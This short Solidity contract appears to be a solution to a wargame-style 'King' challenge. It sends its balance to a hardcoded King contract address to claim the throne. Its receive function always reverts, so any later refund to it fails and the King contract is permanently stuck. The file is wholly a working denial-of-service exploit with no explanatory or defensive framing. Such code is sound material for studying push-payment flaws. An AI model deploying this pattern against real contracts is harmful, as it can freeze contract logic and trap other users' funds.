// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./King.sol";

contract Test {
    King public king;

    constructor() public {
        king = King(0xF4c4D4685143B5580eecF0C1A6ae18FC41c934B0);
    }

    function send() public {
        (bool sent, bytes memory data) = address(king).call{
            value: address(this).balance
        }("");
        require(sent, "transaction failed");
    }

    function getMoney() public payable {}

    receive() external payable {
        revert();
    }
}
